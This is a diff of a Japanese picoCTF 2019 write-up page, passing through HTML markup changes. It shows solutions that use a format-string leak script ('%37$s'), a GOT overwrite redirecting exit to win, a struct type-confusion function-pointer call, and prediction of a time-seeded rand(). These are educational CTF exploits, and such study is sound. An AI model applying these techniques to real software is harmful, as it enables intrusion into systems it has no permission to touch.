-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
-        <span class="k">print</span> <span class="n">i</span><span class="p">,</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;back:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span> <span class="s1">&#39;$s&#39;</span><span class="p">)</span>
-        <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-        <span class="k">print</span> <span class="n">response</span>
-        <span class="k">if</span> <span class="p">(</span> <span class="s1">&#39;picoCTF&#39;</span> <span class="ow">in</span> <span class="n">response</span> <span class="p">):</span>
-            <span class="k">print</span> <span class="s2">&#34;Found!!!&#34;</span>
-            <span class="nb">exit</span><span class="p">()</span>
-        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">print</span> <span class="n">error</span>
-        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>        
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding:utf-8 -*-</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">100</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./vuln&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">i</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;back:</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%&#39;</span> <span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span> <span class="s1">&#39;$s&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">response</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="s1">&#39;picoCTF&#39;</span> <span class="ow">in</span> <span class="n">response</span> <span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span> <span class="s2">&#34;Found!!!&#34;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="n">error</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>        
+</span></span></code></pre></td></tr></table>
 </div>
-</div><p><br />
-37番目に出てくるので、%37$s 入れるだけでもフラグは取れます。</p>
+</div><br />
+37番目に出てくるので、%37$s 入れるだけでもフラグは取れます。
 <pre>
 $ ./vuln 
 input whatever string you want; then it will be printed back:
@@ -662,7 +665,7 @@ picoCTF{str1nG_CH3353_159c98a8}
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <pre>
 $ checksec vuln
     Arch:     i386-32-little
@@ -671,7 +674,7 @@ $ checksec vuln
     NX:       NX enabled
     PIE:      No PIE (0x8048000)   <---
 </pre>
-<p><br /></p>
+<br />
 <h3 id="solution-8">Solution</h3>
 <pre>
 gef➤  x win
@@ -691,8 +694,8 @@ Dump of assembler code for function exit@plt:
    0x0804846b <+11>:	jmp    0x8048410
 </pre>
 <p>0x804a01cを、0x80485c6 (win)に書き換えればOK。</p>
-<p><br />
-10進数で入力します。</p>
+<br />
+10進数で入力します。
 <pre>
 $ ./vuln 
 You can just overwrite an address, what can you do?
@@ -723,12 +726,12 @@ Hint : A function pointer can be used to call any function</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><br /></p>
+<br />
 <h3 id="solution-9">Solution</h3>
 <p>2つ構造体が違うのに、同じポインタのリストを使っているところがポイント。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -739,19 +742,19 @@ Hint : A function pointer can be used to call any function</p>
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">struct</span> <span class="n">Professor</span> <span class="p">{</span>
-    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="n">NAME_SIZE</span><span class="p">];</span>
-    <span class="kt">int</span> <span class="n">lastScore</span><span class="p">;</span>
-<span class="p">};</span>
-
-<span class="k">struct</span> <span class="n">Student</span> <span class="p">{</span>
-    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="n">NAME_SIZE</span><span class="p">];</span>
-    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">scoreProfessor</span><span class="p">)(</span><span class="k">struct</span> <span class="n">Professor</span><span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
-<span class="p">};</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">Professor</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="n">NAME_SIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">lastScore</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">Student</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="n">NAME_SIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">scoreProfessor</span><span class="p">)(</span><span class="k">struct</span> <span class="n">Professor</span><span class="o">*</span><span class="p">,</span> <span class="kt">int</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">};</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>ProfessorのlastScoreにアドレスを入れて、Student構造体としてアクセスさせます。</p>
-<p><br /></p>
+<br />
 <pre>
 $ ./vuln 
 Input the name of a student
@@ -796,35 +799,30 @@ You and the program should sync up!<br /></p>
 <ul>
 <li>seed_spring (ELF 32-bit)</li>
 </ul>
-<p><br />
-実行例：</p>
+<br />
+実行例：
 <pre>
 # ./seed_spring 
-                                                                             
-                          #                mmmmm  mmmmm    "    mm   m   mmm 
-  mmm    mmm    mmm    mmm#          mmm   #   "# #   "# mmm    #"m  # m"   "
- #   "  #"  #  #"  #  #" "#         #   "  #mmm#" #mmmm"   #    # #m # #   mm
-  """m  #""""  #""""  #   #          """m  #      #   "m   #    #  # # #    #
- "mmm"  "#mm"  "#mm"  "#m##         "mmm"  #      #    " mm#mm  #   ##  "mmm"
-                                                                             
-
-
-Welcome! The game is easy: you jump on a sPRiNG.
-How high will you fly?
-
-LEVEL (1/30)
-
-Guess the height: 2
+<pre><code>                      #                mmmmm  mmmmm    &quot;    mm   m   mmm 
+</code></pre>
+<p>mmm    mmm    mmm    mmm#          mmm   #   &ldquo;# #   &ldquo;# mmm    #&ldquo;m  # m&rdquo;   &quot;</p>
+<h1 id="-------------------------mmm-mmmm--------m-----mm">&quot;  #&rdquo;  #  #&rdquo;  #  #&quot; &ldquo;#         #   &quot;  #mmm#&rdquo; #mmmm&quot;   #    # #m # #   mm</h1>
+<p>&ldquo;&ldquo;&ldquo;m  #&rdquo;&rdquo;&rdquo;&quot;  #&quot;&quot;&quot;&quot;  #   #          &ldquo;&ldquo;&ldquo;m  #      #   &ldquo;m   #    #  # # #    #
+&ldquo;mmm&rdquo;  &ldquo;#mm&rdquo;  &ldquo;#mm&rdquo;  &ldquo;#m##         &ldquo;mmm&rdquo;  #      #    &quot; mm#mm  #   ##  &ldquo;mmm&rdquo;</p>
+<p>Welcome! The game is easy: you jump on a sPRiNG.
+How high will you fly?</p>
+<p>LEVEL (1/30)</p>
+<p>Guess the height: 2
 WRONG! Sorry, better luck next time!
-</pre>
-<p><br /></p>
+</pre></p>
+<br />
 <h3 id="solution-10">Solution</h3>
 <p>ランダムのシードをどこから取っているか、GDBとかGhidraとかで確認します。</p>
 <p>現在時間をベースにしているようです。</p>
 <p>以下は、Ghidraの結果をベースに書いたコードです。ほぼ、そのままですけど。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -849,30 +847,30 @@ WRONG! Sorry, better luck next time!
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
-</span><span class="cp"></span>
-<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
-<span class="p">{</span>
-	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
-	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
-	<span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
-	
-	<span class="n">local_18</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="n">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
-	<span class="n">srand</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
-	<span class="n">local_14</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-	<span class="k">while</span><span class="p">(</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
-		<span class="k">if</span> <span class="p">(</span><span class="mh">0x1e</span> <span class="o">&lt;</span> <span class="n">local_14</span><span class="p">)</span> <span class="p">{</span>
-			<span class="k">break</span><span class="p">;</span>
-		<span class="p">}</span>
-		<span class="n">local_1c</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
-		<span class="n">local_1c</span> <span class="o">=</span> <span class="n">local_1c</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">;</span>
-		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">local_1c</span><span class="p">);</span>
-		<span class="n">local_14</span> <span class="o">=</span> <span class="n">local_14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
-	<span class="p">}</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">local_1c</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">local_14</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="n">local_18</span> <span class="o">=</span> <span class="nf">time</span><span class="p">((</span><span class="kt">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">srand</span><span class="p">(</span><span class="n">local_18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="n">local_14</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span><span class="p">(</span> <span class="mi">1</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="mh">0x1e</span> <span class="o">&lt;</span> <span class="n">local_14</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">local_1c</span> <span class="o">=</span> <span class="nf">rand</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">		<span class="n">local_1c</span> <span class="o">=</span> <span class="n">local_1c</span> <span class="o">&amp;</span> <span class="mh">0xf</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">local_1c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="n">local_14</span> <span class="o">=</span> <span class="n">local_14</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>時間を合わせないといけないので、Shell server上で以下のように実行します。</p>
 <pre>
@@ -935,7 +933,7 @@ $ ./seed_spring_solve.o ; nc 2019shell1.picoctf.com 12269
     <footer id="footer" class="footer">
       <div class="social-links">
       <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
-  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+  
 </div>
 
 <div class="copyright">
@@ -970,20 +968,21 @@ $ ./seed_spring_solve.o ; nc 2019shell1.picoctf.com 12269
 
 
 
-<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>
 
 
 <script type="application/javascript">
 var doNotTrack = false;
 if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
 	ga('create', 'UA-104910699-2', 'auto');
 	ga('set', 'anonymizeIp', true);
 	ga('send', 'pageview');
 }
 </script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
 
 
 
